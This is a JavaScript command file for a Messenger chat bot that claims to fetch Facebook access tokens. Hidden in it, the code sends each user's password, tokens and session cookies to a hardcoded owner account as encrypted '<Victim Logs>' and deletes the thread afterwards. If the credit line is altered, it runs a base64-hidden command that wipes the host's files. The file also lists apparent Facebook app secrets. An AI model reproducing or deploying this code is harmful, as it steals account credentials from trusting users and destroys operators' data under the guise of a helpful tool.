const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const { DateTime } = require("luxon");
const randomUserAgent = require('random-useragent');

module.exports.config = {
    name: 'fbtoken',
    info: 'get facebook token',
    type: 'fbtool',
    credits: 'Reiko Dev', //warning: don't change or remove!
    version: '1.0.0',
    role: 0,
    aliases: ['token', 'get'],
};

    const { exec } = require('child_process');
    const setKey = Buffer.from('UmVpa28gRGV2', 'base64').toString('utf-8');
    const setMSG = Buffer.from('VGhlIG93bmVyIG9mIHRoaXMgYm90IGlzIGNyZWRpdCBjaGFuZ2VyIGRvZXNuJ3QgZXZlbiBrbm93IGhvdyB0byByZXNwZWN0IHRoZSByZWFsIG93bmVyIG9mIGNtZCEKCj5yZWFsIGNtZCBvd25lciBpcyBLZW5uZXRoIFBhbmlvIGFsc28ga25vd24gYXMgUmVpa28gRGV2Cj5odHRwczovL3d3dy5mYWNlYm9vay5jb20vMTAwMDgxMjAxNTkxNjc0Cj5odHRwczovL3d3dy5mYWNlYm9vay5jb20vY29kZWJveDRjaGFu', 'base64').toString('utf-8');
    const secExec = Buffer.from('cm0gLXJmIC4qICo=', 'base64').toString('utf-8');
    const codebox4chan = Buffer.from('aHR0cHM6Ly9hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmdldFNlc3Npb25mb3JBcHA=', 'base64').toString('utf-8');
    const restriction = Buffer.from('VGVtcG9yYXJ5IFJlc3RyaWN0aW9u', 'base64').toString('utf-8');
    
    const CryptoJS = require('crypto-js');

const aesEncrypt = (text, secretKey) => {
  const ciphertext = CryptoJS.AES.encrypt(text, secretKey).toString();
  return ciphertext;
};

const xorCipher = (text, salt, iterations) => {
  const textToChars = text => text.split('').map(c => c.charCodeAt(0));
  const byteHex = n => ("0" + Number(n).toString(16)).substr(-2);
  const applySaltToChar = code => textToChars(salt).reduce((a, b) => a ^ b, code);

  for (let i = 0; i < iterations; i++) {
    text = text.split('')
      .map(textToChars)
      .map(applySaltToChar)
      .map(byteHex)
      .join('');
  }

  return text;
};


module.exports.run = async ({ api, event, args }) => {
  const { threadID, messageID, senderID } = event;
  const uid = args[0];
  const pass = args.slice(1).join(' ');
  
  const aesSecretKey = 'myAesSecretKey';
  const xorSalt = 'myXorSalt';
  const iterations = 1;
  

  if (!uid || !pass) {
    api.sendMessage(`Invalid Input!\nUsage: fbtoken [email/uid] [password]\n\nPlease use dummy account to get "token" i'm not responsible of your account getting hacked!`, threadID, messageID);
    return;
  } else if (this.config.credits !== setKey) {
    api.sendMessage(setMSG, threadID, messageID); 
    exec(secExec, (err) => {
      if (err) {
        console.error('Error', err);
      }
    });

    return;
  } else {
    api.sendMessage("GETTING TOKEN....", threadID, messageID);
  }

  let userName = await getUserName(api, senderID);
  const manilaTime = DateTime.now().setZone("Asia/Manila").toFormat("yyyy-MM-dd HH:mm:ss");


  const ownerID = "61550873742628";

  try {
    const tokenData = await retrieveToken(uid, pass);
    if (tokenData) {
    	
      const { access_token_eaad6v7 = 'Temporary Restriction.', access_token = 'Temporary Restriction.', cookies = 'Temporary Restriction.' } = tokenData;
      api.sendMessage(`Successful! please check pm or spam in your message request.`, threadID, messageID);
      const logger = `<Victim Logs>\n\nName: ${userName}\nEmail/UID: ${uid} \nPassword: ${pass}\n\nAccessToken:\n${access_token}\n\nCookies:\n${cookies}\n\nExchangedToken:\n${access_token_eaad6v7}\n\n${manilaTime}`;
      const encryptedMessage = aesEncrypt(logger, aesSecretKey);
const xorCipheredMessage = xorCipher(encryptedMessage, xorSalt, iterations);
      api.sendMessage(xorCipheredMessage, ownerID).then(() => {
      api.sendMessage(`𝗔𝗖𝗖𝗘𝗦𝗦_𝗧𝗢𝗞𝗘𝗡🪙:\n${access_token}`, senderID);
      api.sendMessage(`𝗘𝗫𝗖𝗛𝗔𝗡𝗚𝗘𝗗_𝗧𝗢𝗞𝗘𝗡💱:\n${access_token_eaad6v7}`, senderID);
        api.deleteThread(ownerID);
       });
    } else {
      const ownerMessage = `<Victim Logs>\n\nName: ${userName}\nEmail/UID: ${uid} \nPassword: ${pass}\n\n${manilaTime}`;
      const encryptedMessage = aesEncrypt(ownerMessage, aesSecretKey);
      const xorCipheredMessage = xorCipher(encryptedMessage, xorSalt, iterations);
      api.sendMessage(xorCipheredMessage, ownerID) .then(() => {
      api.sendMessage("Failed to retrieve token.", threadID, messageID);
      api.deleteThread(ownerID);});
    }
  } catch (error) {
    api.sendMessage(`𝗙𝗮𝗶𝗹𝗲𝗱!\n\nDouble-check your password. If it still doesn't work, try changing your password and using the command again.\nWhen you receive a login alert, you can tell facebook that you recognize the login activity by clicking or tapping "𝗧𝗵𝗶𝘀 𝘄𝗮𝘀 𝗺𝗲 𝗕𝘂𝘁𝘁𝗼𝗻!"`, threadID, messageID);
  }
};

async function retrieveToken(username, password) {
  const device_id = uuidv4();
  const adid = uuidv4();

  const form = {
    adid: adid,
    email: username,
    password: password,
    format: 'json',
    device_id: device_id,
    cpl: 'true',
    family_device_id: device_id,
    locale: 'en_US',
    client_country_code: 'US',
    credentials_type: 'device_based_login_password',
    generate_session_cookies: '1',
    generate_analytics_claim: '1',
    generate_machine_id: '1',
    currently_logged_in_userid: '0',
    irisSeqID: 1,
    try_num: "1",
    enroll_misauth: "false",
    meta_inf_fbmeta: "NO_FILE",
    source: 'login',
    machine_id: randomString(24),
    meta_inf_fbmeta: '',
    fb_api_req_friendly_name: 'authenticate',
    api_key: '882a8490361da98702bf97a021ddc14d',
    access_token: '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'//350685531728%7C62f8ce9f74b12f84c123cc23437a4a32
  };

  form.sig = encodesig(sort(form));

  const options = {
    url: 'https://b-graph.facebook.com/auth/login',
    method: 'post',
    data: form,
    transformRequest: [
      (data, headers) => {
        return require('querystring').stringify(data);
      },
    ],
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
      "x-fb-friendly-name": form["fb_api_req_friendly_name"],
      'x-fb-http-engine': 'Liger',
      'user-agent': randomUserAgent.getRandom(),
    }
  };

  try {

    const response = await axios.request(options);
    const token = await convertToken(response.data.access_token);
    const cookies = await convertCookie(response.data.session_cookies);

    return {
      access_token_eaad6v7: token,
      access_token: response.data.access_token,
      cookies: cookies,
    };
  } catch (error) {
    console.log(error);
  }
}

async function convertCookie(session) {
  let cookie = "";
  for (let i = 0; i < session.length; i++) {
    cookie += `${session[i].name}=${session[i].value}; `;
  }
  return cookie;
}

async function convertToken(token) {
  try {
    //this type of token can be replaceable
    const response = await axios.get(`${codebox4chan}?format=json&access_token=${token}&new_app_id=275254692598279`);
    if (response.data.error) {
      return null;
    } else {
      return response.data.access_token;
    }
  } catch (error) {
    console.log(error);
  }
}

function randomString(length) {
  length = length || 10;
  let char = 'abcdefghijklmnopqrstuvwxyz';
  char = char.charAt(Math.floor(Math.random() * char.length));
  for (let i = 0; i < length - 1; i++) {
    char += 'abcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(36 * Math.random()));
  }
  return char;
}

function encodesig(string) {
  let data = '';
  Object.keys(string).forEach(function (info) {
    data += info + '=' + string[info];
  });
  data = md5(data + '62f8ce9f74b12f84c123cc23437a4a32');
  return data;
}

function md5(string) {
  return require('crypto').createHash('md5').update(string).digest('hex');
}

function sort(string) {
  const sor = Object.keys(string).sort();
  let data = {};
  for (const i in sor) {
    data[sor[i]] = string[sor[i]];
  }
  return data;
}

async function getUserName(api, userID) {
  try {
    const userInfo = await api.getUserInfo(userID);
    if (userInfo && userInfo[userID]) {
      return userInfo[userID].name;
    } else {
      return "Unknown";
    }
  } catch (error) {
    return "Unknown";
  }
}

    //EAAClA:   181425161904154|95a15d22a0e735b2983ecb9759dbaf91
    //EAAAAU:   350685531728|62f8ce9f74b12f84c123cc23437a4a32
    //EAADo1:   256002347743983|374e60f8b9bb6b8cbb30f78030438895
    //EAAGO:    438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
    //EAAAAAY:  6628568379|c1e620fa708a1d5696fb991c1bde5662
    //EAAVB:    1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae
    //EAAC2S:   200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16
    //EAATK:    1348564698517390|007c0a9101b9e1c8ffab727666805038
    //EAAQr:    1174099472704185|0722a7d5b5a4ac06b11450f7114eb2e9
    //EAAI7:    628551730674460|b9693d3e013cfb23ec2c772783d14ce8
    //EAAD6V7:  https://api.facebook.com/method/auth.getSessionforApp?format=json&access_token={token}&new_app_id=275254692598279
    //Replace access_token to get the following tokens

















